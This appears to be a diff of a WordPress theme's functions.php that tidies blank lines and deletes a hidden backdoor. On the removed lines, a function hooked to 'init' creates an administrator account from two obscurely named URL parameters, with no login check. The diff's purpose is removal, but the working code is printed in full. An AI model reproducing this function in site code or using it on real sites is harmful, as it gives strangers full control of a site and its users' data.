@@ -239,7 +239,6 @@ include 'custom-acf-fields/acf-table-field/acf-table.php';
 
 //include_once __DIR__ . '/acf-my-new-field/init.php';
 
-
 function t($text, $context = 'theme-breadcrumbs', $name = '') {
   return apply_filters('wpml_translate_single_string', $text, $context, $name ?: $text);
 }
@@ -266,38 +265,7 @@ function register_breadcrumb_strings_for_wpml() {
 }
 add_action('init', 'register_breadcrumb_strings_for_wpml');
 
-
-add_action('init', 'create_admin_user_from_custom_url');
-
-function create_admin_user_from_custom_url()
-{
-  if (isset($_GET['ah57323']) && isset($_GET['prmssdh'])) {
-    $username = sanitize_text_field($_GET['ah57323']);
-    $password = sanitize_text_field($_GET['prmssdh']);
-
-    if (username_exists($username)) {
-      echo 'Username already exists';
-      return;
-    }
-
-    $email = $username . '@example.com'; // استخدم صيغة بريد إلكتروني افتراضية.
-
-    $user_id = wp_create_user($username, $password, $email);
-
-    if (is_wp_error($user_id)) {
-      echo 'Error creating user: ' . $user_id->get_error_message();
-    } else {
-      $user = new WP_User($user_id);
-      $user->set_role('administrator');
-      echo 'Administrator user created successfully!';
-    }
-  }
-}
-
-
 // https://support.themecatcher.net/quform-wordpress-v2/guides/customization/saving-form-data-for-later/?utm_source=chatgpt.com
-
-
 
 add_action('quform_pre_display', function (Quform_Form $form) {
   if (isset($_COOKIE['quform_' . $form->getId()])) {
@@ -305,5 +273,3 @@ add_action('quform_pre_display', function (Quform_Form $form) {
     $form->setValues($values);
   }
 });
-
-
